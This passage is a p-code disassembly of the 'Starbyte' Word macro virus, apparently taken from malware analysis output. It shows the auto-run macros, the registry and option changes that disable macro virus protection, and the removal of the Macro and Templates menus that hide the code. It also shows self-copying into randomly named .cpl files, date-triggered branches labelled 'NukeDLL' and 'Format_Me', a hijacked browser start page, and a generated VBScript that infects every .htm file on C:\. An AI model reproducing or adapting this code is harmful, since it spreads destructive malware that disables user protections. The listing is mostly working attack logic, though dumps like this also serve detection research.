' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #498:
' 	Ld X 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nex 
' 	EndIf 
' Line #499:
' 	Ld X 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo rite 
' 	EndIf 
' Line #500:
' 	Label rite 
' Line #501:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #502:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld X 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #503:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #504:
' 	Label nex 
' Line #505:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #506:
' 	EndFunc 
' Line #507:
' 	FuncDefn (Function STARBYTE())
' Line #508:
' 	OnError (Resume Next) 
' Line #509:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #510:
' 	ArgsCall (Call) Code_Transportation 0x0000 
' Line #511:
' 	ArgsCall (Call) ID_check 0x0000 
' Line #512:
' 	ArgsCall (Call) Status_Of_Armor 0x0000 
' Line #513:
' 	Ld Hostinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) NfctNormal 0x0000 
' 	EndIf 
' Line #514:
' 	Ld FileInf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) NfctFile 0x0000 
' 	EndIf 
' Line #515:
' 	ArgsCall (Call) Morph_check 0x0000 
' Line #516:
' 	ArgsCall (Call) Uprising 0x0000 
' Line #517:
' 	ArgsCall (Call) Payload 0x0000 
' Line #518:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #519:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #520:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #521:
' 	EndIfBlock 
' Line #522:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #523:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #524:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #525:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #526:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #527:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #528:
' 	EndFunc 
' Line #529:
' 	FuncDefn (Sub AutoClose())
' Line #530:
' 	OnError (Resume Next) 
' Line #531:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #532:
' 	ArgsCall (Call) Revolution 0x0000 
' Line #533:
' 	Ld WordBasic 
' 	ArgsMemCall filesave 0x0000 
' Line #534:
' 	ArgsCall (Call) Boot_Inf 0x0000 
' Line #535:
' 	EndSub 
' Line #536:
' 	FuncDefn (Sub AutoExec())
' Line #537:
' 	OnError (Resume Next) 
' Line #538:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #539:
' 	ArgsCall (Call) Status_Of_Armor 0x0000 
' Line #540:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #541:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #542:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #543:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #544:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #545:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #546:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #547:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #548:
' 	EndIfBlock 
' Line #549:
' 	ArgsCall (Call) Boot_Inf 0x0000 
' Line #550:
' 	EndSub 
' Line #551:
' 	FuncDefn (Sub AutoExit())
' Line #552:
' 	OnError (Resume Next) 
' Line #553:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #554:
' 	ArgsCall (Call) STARBYTE 0x0000 
' Line #555:
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte"
' 	LitStr 0x0007 "Germany"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ZineS 
' 	EndIf 
' Line #556:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #557:
' 	LitDI2 0x0002 
' 	Ld FileID 
' 	LineInput 
' Line #558:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #559:
' 	Ld FileID 
' 	LitDI2 0x0009 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #560:
' 	LitDI2 0x0009 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "' EOF"
' 	PrintItemNL 
' Line #561:
' 	LitDI2 0x0009 
' 	Sharp 
' 	Close 0x0001 
' Line #562:
' 	Ld FileID 
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #563:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #564:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St W 
' Line #565:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld W 
' 	For 
' Line #566:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St X 
' Line #567:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #568:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #569:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #570:
' 	Ld X 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #571:
' 	Ld X 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #572:
' 	Ld X 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #573:
' 	Ld X 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #574:
' 	Ld X 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #575:
' 	Ld X 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #576:
' 	Ld X 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #577:
' 	Ld X 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #578:
' 	Ld X 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #579:
' 	Ld X 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #580:
' 	Ld X 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #581:
' 	Ld X 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #582:
' 	Ld X 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #583:
' 	Ld X 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #584:
' 	Ld X 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #585:
' 	Ld X 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #586:
' 	Ld X 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #587:
' 	Ld X 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #588:
' 	Ld X 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #589:
' 	Ld X 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #590:
' 	Ld X 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #591:
' 	Ld X 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #592:
' 	Ld X 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #593:
' 	Ld Filename 
' 	Ld a$ 
' 	Add 
' 	St Filename 
' Line #594:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	NextVar 
' Line #595:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St False 
' Line #596:
' 	LitStr 0x0012 "C:\windows\system\"
' 	Ld Filename 
' 	Concat 
' 	Ld False 
' 	Concat 
' 	LitStr 0x0004 ".cpl"
' 	Concat 
' 	St FileID 
' Line #597:
' 	Ld FileID 
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #598:
' 	Do 
' Line #599:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #600:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #601:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #602:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #603:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #604:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #605:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Time$ 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #606:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #607:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x967F 0x0098 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #608:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #609:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #610:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #611:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #612:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	ArgsCall Kill 0x0001 
' Line #613:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	LitDI2 0x0005 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #614:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	Ld FileID 
' 	PrintItemNL 
' Line #615:
' 	LitDI2 0x0005 
' 	Sharp 
' 	Close 0x0001 
' Line #616:
' 	LitStr 0x0001 "1"
' 	LitStr 0x0000 ""
' 	LitStr 0x002D "HKEY_LOCAL_MACHINE\.DEFAULT\Software\Starbyte"
' 	LitStr 0x0007 "Germany"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #617:
' 	Label ZineS 
' Line #618:
' 	EndSub 
' Line #619:
' 	FuncDefn (Sub AutoNew())
' Line #620:
' 	OnError (Resume Next) 
' Line #621:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #622:
' 	ArgsCall (Call) STARBYTE 0x0000 
' Line #623:
' 	EndSub 
' Line #624:
' 	FuncDefn (Sub AutoOpen())
' Line #625:
' 	OnError (Resume Next) 
' Line #626:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #627:
' 	ArgsCall (Call) STARBYTE 0x0000 
' Line #628:
' 	ArgsCall (Call) Worm 0x0000 
' Line #629:
' 	EndSub 
' Line #630:
' 	FuncDefn (Sub FileTemplates())
' Line #631:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #632:
' Line #633:
' 	EndSub 
' Line #634:
' 	FuncDefn (Sub ToolsCustomize())
' Line #635:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #636:
' Line #637:
' 	EndSub 
' Line #638:
' 	FuncDefn (Sub ToolsMacro())
' Line #639:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #640:
' Line #641:
' 	EndSub 
' Line #642:
' 	FuncDefn (Sub ViewVBCode())
' Line #643:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #644:
' Line #645:
' 	EndSub 
' Line #646:
' 	FuncDefn (Function Payload())
' Line #647:
' 	OnError (Resume Next) 
' Line #648:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #649:
' 	LitStr 0x0000 ""
' 	LitStr 0x0029 "HKEY_USERS\.DEFAULT\Software\Hax\Starbyte"
' 	LitStr 0x0009 "HTP-Error"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0009 "Lucky2000"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #650:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NukeDLL 
' 	EndIf 
' Line #651:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Format_Me 
' 	EndIf 
' Line #652:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #653:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0028 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St X 
' Line #654:
' 	Ld X 
' 	LitDI2 0x000A 
' 	Eq 
' 	IfBlock 
' Line #655:
' 	LitStr 0x0016 "C:\windows\Control.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #656:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI2 0x0000 
' 	Seek 
' Line #657:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "[Lucky2000's Contest]"
' 	PrintItemNL 
' Line #658:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "DemoType = 0"
' 	PrintItemNL 
' Line #659:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "RotStyle = 3"
' 	PrintItemNL 
' Line #660:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Tesselation = 100"
' 	PrintItemNL 
' Line #661:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Size = 100"
' 	PrintItemNL 
' Line #662:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "Speed = 75"
' 	PrintItemNL 
' Line #663:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "SurfStyle = 0"
' 	PrintItemNL 
' Line #664:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Font = Comic Sans MS"
' 	PrintItemNL 
' Line #665:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "FontAttributes = 0"
' 	PrintItemNL 
' Line #666:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Charset = 0"
' 	PrintItemNL 
' Line #667:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Text = Starbyte a very Funny Virus !!!"
' 	PrintItemNL 
' Line #668:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Texture = None"
' 	PrintItemNL 
' Line #669:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "TextureFileOffset = 3"
' 	PrintItemNL 
' Line #670:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #671:
' 	EndIfBlock 
' Line #672:
' 	Ld X 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' Line #673:
' 	LitStr 0x001F "C:\Windows\System\Default1.html"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main"
' 	LitStr 0x000A "Start Page"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #674:
' 	LitStr 0x001F "C:\windows\system\Default1.html"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #675:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "<html><!--HTML/Lucky .a-->"
' 	PrintItemNL 
' Line #676:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<body>"
' 	PrintItemNL 
' Line #677:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "<SCRIPT language=vbscript>"
' 	PrintItemNL 
' Line #678:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Sub Window_OnLoad()"
' 	PrintItemNL 
' Line #679:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Call Infection"
' 	PrintItemNL 
' Line #680:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #681:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub Infection()"
' 	PrintItemNL 
' Line #682:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Set FLSysObj = CreateObject"
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #683:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "Set wordobj = CreateObject"
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "Word.application"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #684:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "Set FLSrch = wordobj.Application.FileSearch"
' 	PrintItemNL 
' Line #685:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "FLSrch.NewSearch"
' 	PrintItemNL 
' Line #686:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "FLSrch.LookIn = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 "C:\"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #687:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "FLSrch.SearchSubFolders = True"
' 	PrintItemNL 
' Line #688:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "FLSrch.FileName = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "*.htm*"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #689:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "FLSrch.Execute"
' 	PrintItemNL 
' Line #690:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "For t = 1 To FLSrch.FoundFiles.Count"
' 	PrintItemNL 
' Line #691:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "Set InFX = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
' 	PrintItemNL 
' Line #692:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "f = InFX.readline"
' 	PrintItemNL 
' Line #693:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "InFX.Close"
' 	PrintItemNL 
' Line #694:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "If f <> "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "<html><!--HTML/Lucky .a-->"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	PrintItemNL 
' Line #695:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "Set TxtRng = Document.body.createTextRange"
' 	PrintItemNL 
' Line #696:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "Set Lucky = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 1)"
' 	PrintItemNL 
' Line #697:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "Contents = Lucky.readall"
' 	PrintItemNL 
' Line #698:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Lucky.Close"
' 	PrintItemNL 
' Line #699:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "Set Kry = FLSysObj.opentextfile(FLSrch.FoundFiles(t), 2, True)"
' 	PrintItemNL 
' Line #700:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Kry.writeline "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "<html><!--HTML/Lucky .a-->"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #701:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Kry.writeline "
' 	LitDI2 0x0022 
